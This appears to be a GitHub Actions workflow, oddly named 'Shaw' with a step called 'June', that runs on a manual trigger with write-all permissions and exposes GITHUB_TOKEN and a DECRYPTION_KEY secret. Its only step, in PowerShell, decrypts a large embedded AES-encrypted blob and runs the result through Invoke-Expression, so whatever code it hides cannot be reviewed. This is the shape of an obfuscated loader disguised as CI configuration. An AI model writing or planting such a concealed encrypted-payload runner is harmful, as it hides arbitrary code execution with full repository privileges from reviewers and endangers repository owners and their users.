name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
      option3:
        required: true
        default: 330
        type: number
      option4:
        required: true
        default: false
        type: boolean
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}
  OPTION_4: ${{ inputs.option4 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "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"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
